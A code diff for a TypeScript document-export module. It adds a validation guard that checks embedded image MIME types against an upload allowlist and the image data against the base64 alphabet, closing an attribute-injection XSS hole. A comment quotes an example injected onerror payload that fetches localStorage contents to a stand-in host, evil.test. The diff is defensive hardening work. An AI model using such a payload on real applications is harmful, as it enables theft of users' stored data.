@@ -60,6 +60,7 @@ import { sanitizeDocumentHtml } from "./sanitize-html";
 import { descriptionHtml } from "./rich-text-plain";
 import { RENDER_SINK } from "./html-start";
 import { htmlEscape, exportCellHtml, PRINT_STYLES } from "./download";
+import { ASSET_MIME_ALLOWED } from "./document-asset-upload";
 import type { ExportCell } from "./export-sections";
 import type { Workspace } from "./workspace";
 import type { Lang } from "./i18n";
@@ -183,6 +184,40 @@ function renderBlock(block: DocBlock, ws: Workspace, lang: Lang): string {
 // attribute to the tag rather than rewriting the value in place.
 const IMG_TAG_RE = /<img\b[^>]*\bdata-asset-id="([^"]*)"[^>]*>/g;
 
+/** Base64 alphabet only. `data` reaches this sink from a Turso column that
+ *  validates no charset, so anything outside the alphabet means the row is not
+ *  what it claims to be — and every byte of it would land inside an attribute
+ *  value. */
+const BASE64_RE = /^[A-Za-z0-9+/=]+$/;
+
+/** ★★★ THE SINK VALIDATES — it does NOT inherit trust from the load path.
+ *  `sanitizeDocumentAsset` runs `mime` through `sanitizeText`, which only trims
+ *  and clips: it strips no `"`, `<` or `>`, and it never consults the upload
+ *  allowlist. So a hostile project file can carry
+ *  `image/png" onerror="fetch('https://evil.test/'+localStorage.getItem(…))`,
+ *  and interpolating that unchecked emits a LIVE event handler — with
+ *  `src="data:image/png"` undecodable, so it fires immediately. The standalone
+ *  output is not inert: `document-download.ts`'s pdf branch `document.write`s it
+ *  into a `window.open("", "_blank")`, an about:blank that INHERITS the app
+ *  origin.
+ *
+ *  ★★ Escaping alone would NOT close this. An escaped `image/svg+xml` is still
+ *  an XSS surface, and the upload allowlist excludes SVG while the load path
+ *  does not — so the check is the ALLOWLIST uploads already obey
+ *  (`ASSET_MIME_ALLOWED`, imported rather than restated so the two cannot
+ *  drift), plus the base64 alphabet for the bytes. A miss falls through to the
+ *  existing `data-asset-missing` branch: an unrenderable asset is marked
+ *  absent, never rendered as a broken URI.
+ *
+ *  ★ Returns the whole ATTRIBUTE, not a boolean, so the only interpolation of
+ *  either value lives inside the guard that just validated both. */
+function assetSrcAttr(data: string | undefined, mime: string | undefined): string | null {
+  if (!data || !mime) return null;
+  if (!(ASSET_MIME_ALLOWED as readonly string[]).includes(mime)) return null;
+  if (!BASE64_RE.test(data)) return null;
+  return ` src="data:${mime};base64,${data}"`;
+}
+
 /** STANDALONE-ONLY. A single downloadable file has to be self-contained, so
  *  this is the one place base64 is correct — `document-asset-images.ts` (the
  *  preview) deliberately never inlines it, and this must not run in preview
@@ -200,8 +235,7 @@ function inlineDocumentImages(html: string, assets: Record<string, string>, mime
     const mime = mimeById.get(id);
     const selfClosing = tag.endsWith("/>");
     const withoutClose = tag.slice(0, selfClosing ? -2 : -1);
-    const addedAttr =
-      data && mime ? ` src="data:${mime};base64,${data}"` : ` data-asset-missing="true"`;
+    const addedAttr = assetSrcAttr(data, mime) ?? ` data-asset-missing="true"`;
     return `${withoutClose}${addedAttr}${selfClosing ? " />" : ">"}`;
   });
 }
